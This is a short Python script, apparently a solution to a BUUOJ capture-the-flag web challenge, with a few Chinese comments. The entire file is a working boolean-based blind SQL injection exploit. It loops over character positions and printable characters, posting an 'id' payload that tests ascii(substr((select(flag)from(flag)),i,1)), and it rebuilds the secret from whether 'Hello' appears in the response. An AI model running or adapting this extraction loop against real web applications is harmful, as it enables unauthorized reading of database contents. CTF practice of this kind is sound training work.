import requests
import base64
import sys
import string
import hashlib
import io
import time

sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding='utf-8')		#改变标准输出的默认编码,否则s.text不能输出
x = string.printable
flag = ""
url = "http://309a08d3-8beb-4414-a0f0-b99548194637.node3.buuoj.cn/index.php"
payload={
	"id" : ""
}
for i in range(0,60):
	for j in x:
		payload["id"] = "1=(ascii(substr((select(flag)from(flag)),%s,1))=%s)=1"%(str(i),ord(j))
        # %(str(i),ord(j)分别赋值给%s
		s = requests.post(url,data=payload)
		# print(s.text)
		if "Hello" in s.text:
			flag += j
			print(flag)
			break
			
print(flag)